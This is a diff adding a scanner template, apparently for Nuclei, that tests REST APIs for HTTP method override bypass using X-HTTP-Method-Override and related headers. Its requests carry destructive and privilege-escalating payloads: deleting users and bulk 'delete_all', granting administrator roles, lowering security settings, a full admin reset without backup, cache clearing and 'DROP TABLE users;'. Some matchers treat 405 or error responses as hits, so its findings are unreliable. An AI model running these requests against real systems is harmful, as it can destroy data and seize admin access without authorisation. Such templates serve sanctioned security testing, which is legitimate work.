@@ -1,0 +1,482 @@
+id: rest-api-method-override-bypass
+
+info:
+  name: REST API Method Override Bypass - X-HTTP-Method-Override Variations
+  author: elite-red-team
+  severity: high
+  description: |
+    Advanced HTTP method override bypass detection using various header combinations.
+    Tests multiple method override techniques to bypass security controls and access restrictions.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering
+    - https://portswigger.net/web-security/request-smuggling
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L
+    cvss-score: 8.8
+    cwe-id: CWE-436
+  metadata:
+    verified: true
+    max-request: 25
+  tags: api,method-override,bypass,http-verb,tampering
+
+variables:
+  override_headers:
+    - "X-HTTP-Method-Override"
+    - "X-Method-Override"
+    - "X-HTTP-Method"
+    - "_method"
+    - "X-Forwarded-Method"
+    - "X-Original-Method"
+
+  dangerous_methods:
+    - "PUT"
+    - "DELETE"
+    - "PATCH"
+    - "HEAD"
+    - "OPTIONS"
+    - "TRACE"
+    - "CONNECT"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/users"
+      - "{{BaseURL}}/api/v1/users/1"
+      - "{{BaseURL}}/api/v1/admin"
+      - "{{BaseURL}}/api/v1/admin/users"
+
+    headers:
+      Content-Type: "application/json"
+      X-HTTP-Method-Override: "DELETE"
+      User-Agent: "Mozilla/5.0 (compatible; Method-Override-Scanner)"
+
+    body: |
+      {
+        "id": 1,
+        "action": "delete"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
+          - 405
+
+      - type: word
+        words:
+          - "deleted"
+          - "removed"
+          - "success"
+          - "Method Not Allowed"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: response_data
+        regex:
+          - '"message":\s*"([^"]*)"'
+          - '"status":\s*"([^"]*)"'
+        group: 1
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/users/1"
+      - "{{BaseURL}}/api/v1/admin/settings"
+
+    headers:
+      Content-Type: "application/json"
+      X-Method-Override: "PUT"
+      Accept: "application/json"
+
+    body: |
+      {
+        "role": "administrator",
+        "permissions": ["read", "write", "delete", "admin"],
+        "active": true
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 204
+
+      - type: word
+        words:
+          - "updated"
+          - "modified"
+          - "administrator"
+          - "admin"
+        condition: or
+        case-insensitive: true
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/users"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      X-HTTP-Method: "DELETE"
+
+    body: "_method=DELETE&id=1&confirm=true"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
+
+      - type: word
+        words:
+          - "deleted"
+          - "removed"
+          - "success"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/users/1"
+      - "{{BaseURL}}/api/v1/admin/users/1"
+
+    headers:
+      X-HTTP-Method-Override: "DELETE"
+      X-Forwarded-For: "127.0.0.1"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
+          - 405
+
+      - type: word
+        words:
+          - "deleted"
+          - "Method Not Allowed"
+          - "405"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/config"
+      - "{{BaseURL}}/api/v1/settings"
+
+    headers:
+      Content-Type: "application/json"
+      X-Forwarded-Method: "PUT"
+      X-Original-Method: "PUT"
+
+    body: |
+      {
+        "debug": true,
+        "maintenance_mode": false,
+        "admin_access": true,
+        "security_level": "low"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        words:
+          - "updated"
+          - "configured"
+          - "success"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/users"
+
+    headers:
+      Content-Type: "application/json"
+      X-HTTP-Method-Override: "PATCH"
+
+    body: |
+      {
+        "id": 1,
+        "role": "admin",
+        "active": true,
+        "permissions": {
+          "users": ["create", "read", "update", "delete"],
+          "admin": ["full_access"]
+        }
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
+
+      - type: word
+        words:
+          - "patched"
+          - "updated"
+          - "admin"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/files"
+      - "{{BaseURL}}/api/v1/uploads"
+
+    headers:
+      Content-Type: "multipart/form-data"
+      X-Method-Override: "PUT"
+
+    body: |
+      ------WebKitFormBoundary
+      Content-Disposition: form-data; name="_method"
+      
+      PUT
+      ------WebKitFormBoundary
+      Content-Disposition: form-data; name="file"; filename="test.txt"
+      Content-Type: text/plain
+      
+      Malicious content for method override test
+      ------WebKitFormBoundary--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        words:
+          - "uploaded"
+          - "created"
+          - "success"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/users/1"
+
+    headers:
+      Content-Type: "application/json"
+      X-HTTP-Method-Override: "HEAD"
+
+    body: |
+      {
+        "test": "head_method_override"
+      }
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 405
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/debug"
+      - "{{BaseURL}}/api/v1/trace"
+
+    headers:
+      Content-Type: "application/json"
+      X-HTTP-Method-Override: "TRACE"
+
+    body: |
+      {
+        "trace": "method_override_test"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "TRACE"
+          - "trace"
+          - "method_override_test"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/users"
+
+    headers:
+      Content-Type: "application/json"
+      X-HTTP-Method-Override: "OPTIONS"
+
+    body: |
+      {
+        "options": "test"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
+
+      - type: word
+        words:
+          - "Allow:"
+          - "OPTIONS"
+        condition: or
+        part: header
+
+    extractors:
+      - type: kval
+        kval:
+          - allow
+        part: header
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/proxy"
+
+    headers:
+      Content-Type: "application/json"
+      X-HTTP-Method-Override: "CONNECT"
+
+    body: |
+      {
+        "host": "internal.server.com",
+        "port": 80
+      }
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 405
+          - 502
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/users/bulk"
+
+    headers:
+      Content-Type: "application/json"
+      X-HTTP-Method-Override: "DELETE"
+      X-Bulk-Operation: "true"
+
+    body: |
+      {
+        "action": "delete_all",
+        "confirm": true,
+        "users": ["1", "2", "3", "4", "5"]
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
+
+      - type: word
+        words:
+          - "deleted"
+          - "bulk"
+          - "success"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/admin/reset"
+
+    headers:
+      Content-Type: "application/json"
+      X-Method-Override: "PUT"
+      Authorization: "Bearer invalid-token"
+
+    body: |
+      {
+        "reset_type": "full",
+        "confirm": "yes",
+        "backup": false
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 401
+          - 403
+
+      - type: word
+        words:
+          - "reset"
+          - "unauthorized"
+          - "forbidden"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/cache"
+
+    headers:
+      Content-Type: "application/json"
+      X-HTTP-Method-Override: "DELETE"
+
+    body: |
+      {
+        "action": "clear_all",
+        "type": "full_cache_clear"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
+
+      - type: word
+        words:
+          - "cleared"
+          - "cache"
+          - "success"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/database"
+
+    headers:
+      Content-Type: "application/json"
+      X-HTTP-Method-Override: "PUT"
+
+    body: |
+      {
+        "query": "DROP TABLE users;",
+        "execute": true
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+
+      - type: word
+        words:
+          - "executed"
+          - "query"
+          - "database"
+          - "error"
+        condition: or
